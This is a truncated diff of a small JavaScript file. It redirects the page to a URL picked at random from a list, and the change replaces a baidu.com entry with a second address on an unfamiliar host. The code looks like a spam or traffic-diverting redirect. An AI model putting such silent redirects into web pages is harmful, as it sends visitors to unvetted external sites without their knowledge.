@@ -1,6 +1,6 @@
 var urls=[
 ' https://resource.xinmaijiaoyu.com/user/2024043017554464955065.sb.com#{nnnnnnn}{wwww}',
-' https://baidu.com#{nnnnnnn}{wwww}',];
+' https://resource.xinmaijiaoyu.com/user/2024043018543720001524.sb.com#{nnnnnnn}{wwww}',];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
 	return s.replace(/\{(\w+?)\}/g,function(a,b){
